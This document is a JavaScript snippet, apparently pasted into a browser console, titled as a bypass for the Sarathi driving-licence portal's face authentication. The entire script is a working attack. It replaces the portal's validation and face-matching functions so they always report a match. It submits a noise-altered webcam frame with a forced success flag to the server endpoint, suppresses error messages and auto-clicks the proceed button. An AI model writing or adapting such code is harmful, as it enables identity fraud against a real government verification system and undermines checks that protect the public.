(function() {
console.log("🔓 Sarathi Face Auth Max Bypass Attempt - v11");

// Helper - Error Message Hide
function hideErrorMessage() {
const msgElem = document.getElementById('message');
if (msgElem) {
msgElem.style.display = 'none';
msgElem.innerText = '';
}
}

// Helper - Proceed Button Enable & Auto Click
function enableAndClickProceed() {
const proceedBtn = document.getElementById('capphto1');
if (proceedBtn) {
proceedBtn.disabled = false;
setTimeout(() => proceedBtn.click(), 250);
}
}

// Helper - Live Webcam Frame as Image
function getLiveWebcamPhoto() {
const video = document.querySelector('video');
const tempCanvas = document.createElement('canvas');
tempCanvas.width = video?.videoWidth || 300;
tempCanvas.height = video?.videoHeight || 300;
const ctx = tempCanvas.getContext('2d');
if (video && video.readyState >= 2) {
ctx.drawImage(video, 0, 0, tempCanvas.width, tempCanvas.height);
} else {
ctx.fillStyle = "#fff";
ctx.fillRect(0, 0, tempCanvas.width, tempCanvas.height);
}
// Minor random pixel noise for uniqueness
let imgData = ctx.getImageData(0, 0, tempCanvas.width, tempCanvas.height);
for (let i = 0; i < imgData.data.length; i += 4) {
imgData.data[i] = Math.min(255, imgData.data[i] + Math.floor(Math.random() * 6));
imgData.data[i + 1] = Math.min(255, imgData.data[i + 1] + Math.floor(Math.random() * 6));
imgData.data[i + 2] = Math.min(255, imgData.data[i + 2] + Math.floor(Math.random() * 6));
}
ctx.putImageData(imgData, 0, 0);
return tempCanvas.toDataURL("image/jpeg", 0.85);
}

// Helper - Send AJAX Request (max 3 retries)
function sendFaceAuthData(attempts = 0) {
if (attempts > 2) {
hideErrorMessage();
enableAndClickProceed();
return;
}
const applno = document.getElementById('llappln')?.value.trim();
const rtocode = document.getElementById('rtocode')?.value.trim();
const fakePhoto = getLiveWebcamPhoto();

$.ajax({
type: 'POST',
url: '/sarathiservice/saveFaceAuthData.do',
data: {
applno: applno,
rtocode: rtocode,
faceres: 1,
CapPho: fakePhoto
},
dataType: 'json',
success: function(actualResponse) {
enableAndClickProceed();
hideErrorMessage();
},
error: function(xhr) {
// Actual server error, show for debug
if (xhr?.responseText) {
console.log("Server error: ", xhr?.responseText);
}
// Retry with new photo
setTimeout(() => sendFaceAuthData(attempts + 1), 700);
}
});
}

// Patch error/validation functions (UI errors hide)
window.showAuthenticationError = function() { hideErrorMessage(); return false; };
window.showFaceAuthError = function() { hideErrorMessage(); return false; };
window.validateFaceAuthentication = function() { return true; };
window.checkServerResponse = function() { return null; };

// Patch aware.match (force success)
if (window.aware && typeof window.aware.match === "function") {
window.aware.match = function() {
return new Promise(function(resolve) {
setTimeout(function() {
if (window.messageToShown) {
window.messageToShown.innerHTML = "Face matched successfully, please proceed.";
}
sendFaceAuthData(0);
resolve({
isMatch: true,
message: "Face matched successfully, please proceed.",
nextExp: "",
photo: ""
});
}, 400);
});
};
}

// Patch insertfeceauth (force success)
if (typeof window.insertfeceauth === "function") {
window.insertfeceauth = function(faceresult, llappln, rtocode, result_photo) {
sendFaceAuthData(0);
return true;
};
}

// Hide error message bar-bar (in case UI shows again)
setInterval(hideErrorMessage, 400);

// Start process forcibly after DOM ready
setTimeout(function() {
if (window.aware && typeof window.aware.match === "function") {
window.aware.match();
} else {
sendFaceAuthData(0);
}
}, 1200);

})();